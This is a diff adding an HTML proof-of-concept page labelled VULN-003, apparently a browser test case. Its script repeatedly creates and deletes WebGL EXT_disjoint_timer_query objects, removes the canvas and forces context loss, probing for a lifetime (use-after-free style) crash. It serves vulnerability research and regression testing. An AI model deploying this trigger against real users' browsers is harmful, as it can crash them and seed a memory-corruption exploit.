@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>VULN-003 EXTDisjointTimerQuery lifetime</title></head>
+<body><pre id="log">POC STARTED: VULN-003 EXTDisjointTimerQuery
+</pre><canvas id="c" width="16" height="16"></canvas>
+<script>
+if (window.testRunner) { testRunner.dumpAsText(); testRunner.waitUntilDone(); }
+function log(m) { document.getElementById('log').textContent += m + '\n'; }
+function finish(){ log('NO CRASH OBSERVED'); log('DONE'); if (window.testRunner) testRunner.notifyDone(); }
+function run(){
+    log('PHASE: setup WebGL');
+    let canvas = document.getElementById('c');
+    let gl = null, ext = null;
+    try { gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); log('ACTION: WebGL context ' + (gl ? 'created' : 'unavailable')); } catch(e){ log('ACTION: WebGL context threw ' + e.name); }
+    if (!gl) { finish(); return; }
+    try { ext = gl.getExtension('EXT_disjoint_timer_query'); log('ACTION: EXT_disjoint_timer_query ' + (ext ? 'available' : 'unavailable')); } catch(e){ log('ACTION: extension query threw ' + e.name); }
+    if (!ext) { finish(); return; }
+    for (let i = 0; i < 8; ++i) {
+        log('PHASE: query iteration ' + i);
+        let q = null;
+        try { q = ext.createQueryEXT(); log('ACTION: query created'); } catch(e){ log('ACTION: createQueryEXT threw ' + e.name); }
+        try { ext.beginQueryEXT(ext.TIME_ELAPSED_EXT, q); gl.clear(gl.COLOR_BUFFER_BIT); ext.endQueryEXT(ext.TIME_ELAPSED_EXT); log('ACTION: query begin/end attempted'); } catch(e){ log('ACTION: query begin/end threw ' + e.name); }
+        try { ext.deleteQueryEXT(q); log('ACTION: query delete attempted'); } catch(e){ log('ACTION: query delete threw ' + e.name); }
+        try { canvas.remove(); log('ACTION: canvas removal attempted'); document.body.appendChild(canvas); } catch(e){ log('ACTION: canvas remove/reinsert threw ' + e.name); }
+        try { gl.getExtension('WEBGL_lose_context') && gl.getExtension('WEBGL_lose_context').loseContext(); log('ACTION: context loss attempted'); } catch(e){ log('ACTION: context loss threw ' + e.name); }
+    }
+    setTimeout(finish, 0);
+}
+run();
+</script></body></html>
